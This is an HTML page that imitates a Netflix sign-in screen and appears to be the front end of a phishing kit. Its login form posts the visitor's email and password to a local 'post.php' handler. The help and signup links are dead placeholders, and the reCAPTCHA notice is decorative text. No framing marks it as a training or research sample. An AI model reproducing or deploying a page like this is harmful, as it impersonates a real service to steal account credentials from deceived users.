<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Netflix Login</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="netflix-bg">
    <div class="overlay"></div>
    <div class="login-container">
      <h1 class="logo">NETFLIX</h1>
      <form class="login-form" id="loginForm" action="post.php" method="POST" autocomplete="off">
        <h2>Sign In</h2>
        <input type="email" name="email" placeholder="Email or phone number" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Sign In</button>
        <div class="options">
          <label><input type="checkbox"> Remember me</label>
          <a href="#">Need help?</a>
        </div>
        <div class="signup">
          <span>New to Netflix?</span> <a href="#">Sign up now</a>.
        </div>
        <p class="recaptcha">This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more.</a></p>
      </form>
      <div id="error-message" style="color:#e50914; margin-top:10px; text-align:center;"></div>
    </div>
  </div>
</body>
<!-- Removed AJAX/fetch login script for classic form POST compatibility -->
</html>
